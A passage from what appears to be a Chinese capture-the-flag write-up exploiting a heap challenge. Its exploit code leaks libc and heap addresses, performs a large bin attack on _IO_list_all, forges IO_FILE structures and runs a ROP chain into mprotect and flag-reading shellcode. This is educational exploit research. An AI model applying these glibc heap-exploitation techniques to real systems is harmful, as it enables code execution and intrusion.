<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    v9<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    v10<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  v9<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>k <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    v6 <span class=\"token operator\">=</span> <span class=\"token function\">minDistance</span><span class=\"token punctuation\">(</span>v9<span class=\"token punctuation\">,</span> v10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    v10<span class=\"token punctuation\">[</span>v6<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> m <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> m <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>m <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v10<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v6 <span class=\"token operator\">+</span> m<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> v9<span class=\"token punctuation\">[</span>v6<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">9999</span> <span class=\"token operator\">&amp;&amp;</span> v9<span class=\"token punctuation\">[</span>v6<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v6 <span class=\"token operator\">+</span> m<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> v9<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        v9<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v9<span class=\"token punctuation\">[</span>v6<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v6 <span class=\"token operator\">+</span> m<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Where do you want to travel?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  city_name <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"It is %dkm away from Guangzhou.\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v9<span class=\"token punctuation\">[</span>city_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v9<span class=\"token punctuation\">[</span>city_name<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">2000</span> <span class=\"token operator\">&amp;&amp;</span> v9<span class=\"token punctuation\">[</span>city_name<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">9999</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"That's so far! Please review and rewrite it!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token operator\">++</span>edit_flag2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  <span class=\"token keyword\">return</span> v12 <span class=\"token operator\">-</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>需要到 Guangzhou 的一条路径大于 2000 才能是的 edit_flag2 置 1</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># chunk0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># chunk1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># chunk2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># chunk3</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Dijkstra<span class=\"token punctuation\">(</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-apple/image-20240830113533522.png\" alt=\"image-20240830113533522\"></p>\n<p>可以看到大于 2000，从而进入 edit_flag2++ 的分支</p>\n<p>通过此方式先将 edit_flag2 置 1，接下来去 free 在 add 泄露残留的指针</p>\n<hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># chunk0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># chunk2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'train'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><img data-src=\"/img/house-of-apple/image-20240830113737005.png\" alt=\"image-20240830113737005\" style=\"zoom: 67%;\" />\n<p><img data-src=\"/img/house-of-apple/image-20240830113759781.png\" alt=\"image-20240830113759781\"></p>\n<p>将 chunk0 和 chunk2 置入 large bin，从而残留 fd 和 bk 指针，泄露 libc 和 heap</p>\n<hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1234'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'N'</span><span class=\"token operator\">*</span><span class=\"token number\">0x4ef</span><span class=\"token operator\">+</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x21b110</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'N'</span><span class=\"token operator\">*</span><span class=\"token number\">0x4f7</span><span class=\"token operator\">+</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>heapbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x001470</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-apple/image-20240830114122375.png\" alt=\"image-20240830114122375\"></p>\n<p>heap 同样，因为用 printf 泄露会被’\\x00’截断，释放之后再次写数据覆盖 libc 即可泄露</p>\n<p>清空 chunk，申请几个去泄露 libc 和 heap 地址</p>\n<hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>再次清空，准备进行 large bin attack 将 <code>fake_io_addr</code>  写入 io_list_all</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>target<span class=\"token operator\">=</span>libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_list_all'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fake_io_1_addr<span class=\"token operator\">=</span>heapbase<span class=\"token operator\">+</span><span class=\"token number\">0x1470</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>fake_io_2_addr<span class=\"token operator\">=</span>fake_io_1_addr<span class=\"token operator\">+</span><span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>_IO_wstrn_jumps <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x216dc0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>_IO_cookie_jumps <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x216b80</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>_lock <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span>  <span class=\"token number\">0x21ca60</span><span class=\"token comment\">#libc.sym._IO_stdfile_2_lock</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>point_guard_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x381770</span><span class=\"token comment\">#关闭 alse 情况下 0x381770</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>expected <span class=\"token operator\">=</span> fake_io_2_addr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>magic_gadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000167420</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>mov_rsp_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x5a120</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>add_rsp_0x20_pop_rbx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xd2ba5</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x2a3e5</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>pop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x2be51</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>pop_rdx_rbx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x904a9</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>fake_io_1 <span class=\"token operator\">=</span> IO_FILE_plus_struct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>chain <span class=\"token operator\">=</span> fake_io_2_addr</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>_flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>_mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>_lock <span class=\"token operator\">=</span> _lock</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>_wide_data <span class=\"token operator\">=</span> point_guard_addr</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>vtable <span class=\"token operator\">=</span> _IO_wstrn_jumps</pre></td></tr><tr><td data-num=\"24\"></td><td><pre> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>fake_io_2 <span class=\"token operator\">=</span> IO_FILE_plus_struct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>_IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>_IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>_lock <span class=\"token operator\">=</span> _lock</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>_mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>_flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>vtable <span class=\"token operator\">=</span> _IO_cookie_jumps <span class=\"token operator\">+</span> <span class=\"token number\">0x58</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>data <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>fake_io_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">0xe0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>fake_io_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token number\">0xe0</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span> rol<span class=\"token punctuation\">(</span>magic_gadget <span class=\"token operator\">^</span> expected<span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token number\">0x100</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            add_rsp_0x20_pop_rbx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            mov_rsp_rdx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            pop_rdi_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            fake_io_2_addr <span class=\"token operator\">&amp;</span> <span class=\"token operator\">~</span><span class=\"token number\">0xfff</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            pop_rsi_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token number\">0x4000</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            pop_rdx_rbx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'mprotect'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x200</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token number\">0x200</span><span class=\"token punctuation\">:</span> ShellcodeMall<span class=\"token punctuation\">.</span>amd64<span class=\"token punctuation\">.</span>cat_flag</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x521</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 通过 heaplist 残留指针使其再次可用，为 large bin attack 覆写 bk_nextsize 作准备</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'train'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk2</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token 